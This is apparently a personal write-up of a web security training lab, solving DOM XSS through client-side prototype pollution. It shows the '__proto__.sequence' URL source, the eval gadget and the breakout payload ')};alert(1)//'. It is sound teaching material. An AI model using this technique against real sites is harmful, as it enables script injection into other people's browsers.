This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
    
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
    
3. Combine these to call `alert()`.


# Solution

1. Identify prototype pollution

This lab requires the dot notation of the target property:

```
/?__proto__.testproperty=DOM_INVADER_PP_POC
```

![[PP-vector.png]]

2. Find an exploitable gadget

![[eval-sink.png]]

The source code uses the `eval` sink along with an injectable property of the `manager` object

3. Craft an exploit

Manipulate the `sequence` property for the Object prototype:

```
/?__proto__.sequence=TESTDOM
```

![[injectable.png]]

Now create an string that will execute the alert function within the `eval` context.

```javascript

eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
```

```
)};alert(1)//
```

This payload will be just enough to result in:

```javascript
eval('if(manager && manager.sequence){ manager.macro()};alert(1)//) }');
```

![[Advanced Topics/Prototype pollution/Client-Side Prototype Pollution/labs/DOM XSS via an alternative prototype pollution vector/images/exploited.png]]


the DOM invader will not give  a fully functional exploit as it's not context aware.